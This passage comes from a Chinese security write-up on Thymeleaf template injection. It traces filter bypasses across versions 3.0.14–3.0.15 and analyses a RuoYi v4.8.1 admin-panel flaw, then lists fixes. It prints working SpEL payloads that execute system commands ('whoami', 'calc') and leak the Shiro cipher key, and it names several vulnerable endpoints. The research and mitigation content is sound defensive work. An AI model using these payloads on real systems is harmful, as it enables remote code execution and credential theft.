![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRDanUKiacj1fExN7bEibeeAaAn9RR7OM3LvQfHtAicqTHXe9qXE5j9Sex35KqZiapX4tsnj2QdvS5fpLYdqZAiaibibXEhc9LjIBWicuHI/640?wx_fmt=png&from=appmsg "")  
  
也就是说，我们输入的：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dBEVa0kEoRDY1v6EZFCcsGyS9yBHY5onSEIPI1PWia5w2zAA0Dx70h8fJlvNf19PcIREMN1ujm5mcvE6QE9UBRWviaLJaWQv0CCooiaOLbsPXA/640?wx_fmt=png&from=appmsg "")  
  
等价于：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRCLMhemj876mhgiaxyVcQ0spP2ZB3m1BeAnL5I1dBZMZibtk5C6rGYYo9elVBd0qZhGib4QFqjVfLFGctvwqpmlBxhnVceLM8Hhy4/640?wx_fmt=png&from=appmsg "")  
  
还有一种方法，在 Thymeleaf 的字面量替换（Literal Substitution）语法中，若 || 内部无任何内容，则求值结果将被替换为空字符串。因此，表达式 $||{} 将被等价转换为 ${}。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRDTmJATq8nBXQduUeKUVTSWmFaLWiaaL3LeGToEU8Mc86K8Aj3iaPdRU3uBZTHfnYLw58OcyqaacrVBKk2bEuaK9ibgTUiaPKGq8XA/640?wx_fmt=png&from=appmsg "")  
  
那么就可以执行后面的SPEL表达式了，我们再看看org.thymeleaf.spring5.util.SpringStandardExpressionUtils[#isPreviousStaticMarker]()  
，是否对T关键字有了新的变化，发现了一个“isSafeIdentifierChar”检测，“isSafeIdentifierChar”方法要求我们输入的内容为可见字符串，因而原先的制表符以及%00绕过方法已经无法使用了。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dBEVa0kEoRD1icymzJ7lss5A7DnbXIU79XhPS1898sm1PlT8gU7ic3XfDP28YUu7SQkn2v81ibkASHYSagWGYxz85vB0Eo7g5nqt0xiarDc8x8w/640?wx_fmt=png&from=appmsg "")  
  
这里对“T”限制十分严格，我们可转变思路，直接利用JDK标准库中的 ProcessBuilder 类。该类无需类型引用即可通过New进行实例化，随后调用 start() 方法启动进程，实现系统命令执行。无回显PoC如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dBEVa0kEoRAUQkVEJsmV7Eqibw3iaTz81oSfvjBGibzsEOUeQR7bwPjzZjUKrAFN7Xq4Kv88ibqM2EMII3XFPUa6licE7PkDGyrQgsyG2bjY66BM/640?wx_fmt=png&from=appmsg "")  
  
有回显PoC如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRBtdjeFdcla4ZUHpuAibfgOB8OFiazAsOqMpNmj0vw5NCZ6F400KS1TxWLx49hdlbom4vMrc0QbiaM2iae37qxmvTG31rUKCby0GLU/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dBEVa0kEoRDCyYmke9UNXQqER4WcGtgHoSwoIT4JbTibvTxCNXxCygIn08hBvibstPlKFKZ4ghWLw5YA3bs4LEJ7IbLHI8iceCyicq657KAzGnE/640?wx_fmt=png&from=appmsg "")  
  
**3.5 Thymeleaf 3.0.15**  
  
这个版本thymeleaf-spring5的检测逻辑无较多变化，但是在thymeleaf本体中增加了一些检测以及黑名单。org.thymeleaf.util.ExpressionUtils#isTypeAllowed  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRAbz8iamOEjKbgOqNEje53OI3fkFNn0xpsZTCpOC6kibcibDD0GyQ4IRKpWKy30c7mAuf5D8ukvU1nB9aDJfA34WIFgm8Sa7IwLMY/640?wx_fmt=png&from=appmsg "")  
  
此外，在org.thymeleaf.standard.expression.LiteralSubstitutionUtil[#performLiteralSubstitution中对3]()  
  
.0.14的“$||{…}”方式进行了修复，这里的LITERAL_SUBSTITUTION_DELIMITER定义的值为“|”，但是“|$${…}|::.”格式的PoC还是可以继续使用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRClR27ficMgJdNOevDtU6ictM4Qd6p0c1xmeicyqogRZzca3WmibWupw9vGXHZmzDEMnek1CU89NpcAIX1ibj3VgB5ZPnkMYlgs816Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dBEVa0kEoRAAQTvsHOyfhTul0d79KAc8GVxIA004qxBtibSrmy5VwKpQxv3gSZlnRpmv9g3ia4oiaBaFbTVGJTiabrbIRV5MkZxMhCDibdiaUCMTM/640?wx_fmt=png&from=appmsg "")  
  
我们可以通过反射的方式绕过黑名单限制，例如：  
```
__|$${#response.addHeader("cmd","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("org.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec('whoami').getInputStream())"))}|__::.
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRD9aglOxibfasMaicuIiauwc8LL8gIBKcL5gEtP67Obebia8H5yNnnEIZOU6N5VYCPcYywDkO5DH8DkoT0picodkVl8AtmKsMtXKibnw/640?wx_fmt=png&from=appmsg "")  
  
**04**  
  
**实战案例**  
  
  
先拿个近期公开的若依v4.8.1后台Thymeleaf模板注入漏洞进行分析吧，我在查询资料的过程中发现，已经有大佬在一年前就已经发现这个漏洞了，但是这个漏洞近期才被修复。因而对外部引入的组件管理也尤为重要，建议在管理软件产品时，引入SBOM清单管理制度，对存在漏洞的组件进行持续监控。废话不多说了，先讲讲如何搭建环境。  
  
**4.1 环境搭建**  
  
首先导入ry_20250416.sql与quartz.sql文件，修改配置文件application-druid.yml账号密码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dBEVa0kEoRBufD3DNOfRLO2Yfooxun50YO8Dwa92sGic0Eo9JXWLHy7zoCJPdI4IeVicUqn6O0qbibukq7s64nbKknelWFY84FFA8lqibEfpHa8/640?wx_fmt=png&from=appmsg "")  
  
部署成功，登录至后台界面  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dBEVa0kEoRDOJlV7xSKIOqiazAE9T3ua8XSSck8LHdfx534jp2dhxJpr8CXLlyibZyz9WcsCcvJBxXOcdvAvNoayhzAXlPk6TxaqDsBoSTb4A/640?wx_fmt=png&from=appmsg "")  
  
**4.2 漏洞分析**  
  
这里先给出PoC：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dBEVa0kEoRD4spibljXyWias2hWMdEcNp1icCgzibhNZWf0x1c66dichDDicUpysvd2vFJyDgXq5CF448dklOicz4HKgicroJwZb9xSUqKYszATDHfM/640?wx_fmt=png&from=appmsg "")  
  
全局搜索getNames，进入getCacheNames方法：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dBEVa0kEoRAZPK1XiaNUP0IOD2FkqJvXxuSQsXGAjlVqC6aaQSgLDAfVh8auHU9Ak8mNbwibuicPfIr3azicFmc46No3WTrndKZTxvcF0mj1M4Q/640?wx_fmt=png&from=appmsg "")  
  
可以看到这就是一个典型的Thymeleaf漏洞案例，直接渲染我们输入的Fragment参数：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRAEPYSnTgWhibbDv8DhRqHlE5t7rX7Dib1I5aD5BwDkGDTKrqPI1bMhJ9jcKGdZwicVvEKn01FwvnHOxribhTJZgm7GGMtnh6Cq7ww/640?wx_fmt=png&from=appmsg "")  
  
看看Thymeleaf版本，可以看到版本为3.0.15，这个版本存在绕过的方式，因而存在漏洞。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dBEVa0kEoRBIP7NGJOnhMwPYE5NibMuh8CApw0mMzeMFyvoxWzcWUmho40htLZfxvxRQxuxSibSLAtBXnK6Hw7CtBYx4E25RGXKPdO0mraRQM/640?wx_fmt=png&from=appmsg "")  
  
执行3.0.15的PoC，可以看到成功执行了calc的命令。  
```
__|$${#response.addHeader("cmd","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("org.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec('calc').getInputStream())"))}|__::.
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dBEVa0kEoRAAtJiaqpBxNqN8Vianyicv5ibLM5oSGNHOpeic6WVZmx3YenwjCvQOZ3TIELgPwalibbNdXgOAUtpAOh8DsZb46EQ6GIWuiaO5Wiaskdg/640?wx_fmt=png&from=appmsg "")  
  
我们还可以通过以下PoC获取shirokey，利用过程就不过多细述。  
```
__|$${#response.getWriter().print(@securityManager.getClass().forName('java.util.Base64').getMethod('getEncoder').invoke(null).encodeToString(@securityManager.rememberMeManager.cipherKey))}|__::.x
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dBEVa0kEoRB2tn8L7TwXM44mibG2YNsTUARQtLagKXxibTEVmyNsZnDVWHRY5erDHUcibcbKI3KLzN1SHbJGUXvSaeahkicA3g3BgPjqRPK2R50/640?wx_fmt=png&from=appmsg "")  
  
**4.3 深入分析**  
  
根据网上公开的PoC来看，几乎所有的入口都是“/monitor/cache/getNames”，其实还有其他接口也可以。我们全局搜索：“return.*::”，发现还有其他三个接口存在漏洞。分别是“/demo/form/localrefresh/task”、“/monitor/cache/getKeys”、“/monitor/cache/getValue”。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dBEVa0kEoRBawWu0gxaRLHVZLibNgHYm5hB0UoNc2Rz3DBGZEvzzSMy6Ntibr2tYRL66Ha0K342Algq1usiaRvzE2u1PO2Da2aiaxibQF9S5HHKA/640?wx_fmt=png&from=appmsg "")  
  
我们就简单分析一下“/demo/form/localrefresh/task”接口吧，可以看到需要我们传入fragment、taskName、mmap参数(实际上传入fragment参数即可)。可控点依旧是"fragment"。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dBEVa0kEoRDIPq5tLibX57diauKyxmicRibkHpUD25G2ibUpqKzYJ45oxYHKtXxsDsJJds4z04apIeWh0S8QMaY33vr6b8p24Z7xP8j2icF0RtLo4/640?wx_fmt=png&from=appmsg "")  
  
PoC也很简单，只是换了不同的接口而已：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRD1sMAWlj5WfDdSm1IGoZuXuKTWldGcIUPeYicsWB67dRPDhVyayto5rR7kAnogvg6eEU1jo2vLAeI5o06sRVm2Qo2KwaGRoeCE/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRBiafuXEiaia6HMocLpDocv3Ys1lFibdk83RTokk2ic3XdJ53V9gOLtYicUSU241vk7MXTkKdfSNGl4x9ahxKbEhbVnOcHrRXAwNuQAo/640?wx_fmt=png&from=appmsg "")  
  
研究其他触发接口有什么用呢，这里我找到某个漏洞issues，使用这个系统的开发人员并没有打算升级系统至安全版本，而是选择注释代码，可能仅仅注释了网上爆出来的“/monitor/cache/getNames”接口，但是其他存在漏洞的接口并没有做任何处理，因而漏洞仍然存在，并没有完全修复。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRChic8jvbIJ4YVfARiazunGCkLCSAzP5IPUBqO8G1BqfW4m4pSdS1HWjibxBCBMQd5uv1f199JiaIWGdLJwl2ZZvCHRDbekM4XTribI/640?wx_fmt=png&from=appmsg "")  
  
**05**  
  
修复方案  
  
  
**5.1 设置HttpServletResponse参数方法**  
  
controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析，也就不存在Thymeleaf模板注入漏洞。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dBEVa0kEoRCjOANE2aOOe7hljCJ7tk7tp1DQm6r5Wc48ia4d3q3tWwaib7tNU50fVP7w8eCS5uXxeW1o5ViaM6w7CvMh0FxmGWPSibI0QVVYrBU/640?wx_fmt=png&from=appmsg "")  
  
**5.2 使用redirect:或forward:修饰**  
  
根据spring boot定义，如果名称以redirect:和forward开头，则不再调用ThymeleafView解析，调用RedirectView去解析controller的返回值。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRBsA1UUBhYBAmtmRTs8SUvrQBTeiblWe4CmAMibfFgX41aXN1vNiaKpmW5UXiadLnLricSENj8fmQSkw9eMmzRqyAAAHNaIDsC0n1VQ/640?wx_fmt=png&from=appmsg "")  
  
**5.3 使用@ResponseBody或@RestController修饰**  
  
**1. @ResponseBody**  
- 修饰方法或类，表示该方法的返回值不走视图解析器（如 ThymeleafViewResolver），而是通过 HttpMessageConverter（通常 Jackson）直接序列化成响应体内容（JSON/XML 等）。  
  
- 使用 @ResponseBody 后，返回值是数据对象 → 不返回视图名 → 完全跳过 Thymeleaf 渲染路径。  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRAVZZgHiaHOvYz3AFO2Slib7BWIzKZwqicqEAufTIiaXj4rATRI3bwceicg2ibNqDIISibO4JPfA5ty1CeOPicXQ10bSHnKq6cuDfpSUTE/640?wx_fmt=png&from=appmsg "")  
  
**2. @RestController**  
  
- 是 @Controller + @ResponseBody 的组合注解（@RestController = @Controller + @ResponseBody）。  
  
修饰类，表示该 Controller 所有方法返回值都直接写入响应体（默认 JSON），专用于 REST API。  
  
- API 接口（常见 SSTI 目标，如监控、缓存接口）直接返回 JSON → 用户输入无法污染视图名 → SSTI 不可能触发。  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dBEVa0kEoRCWtXU1kcz644W9BgaBbDzaicgTvyf5cv9LzQOsDJxJZOJFOE6eMmEJYwSwowSmsmL5weQb0gIHUWibbLJjPbglvhfQ3jOVFgJkY/640?wx_fmt=png&from=appmsg "")  
  
  
  
**参考来源：**  
  
https://segmentfault.com/a/1190000021848063#item-1  
  
https://mp.weixin.qq.com/s/LvzahtrIu7ESL0FwrwxEEA  
  
https://mp.weixin.qq.com/s/pBt3Q0VF44AD7tTXxCD7Kg  
  
https://forum.butian.net/share/1922  
  
https://mp.weixin.qq.com/s/P7Io0VCaI3b1MSMjgr1AnA  
  
https://www.cnpanda.net/sec/1063.html  
  
https://www.freebuf.com/vuls/413661.html  
  
https://mp.weixin.qq.com/s/uxvGbO4biM87DVSXA_ZlQw  
  
https://mp.weixin.qq.com/s/Sk9ySY837o7U-NAn6dN0RA  
  
https://mp.weixin.qq.com/s/_wSw7TJKHXzYuphRQbWxsg  
  
  
**-END-**  
  
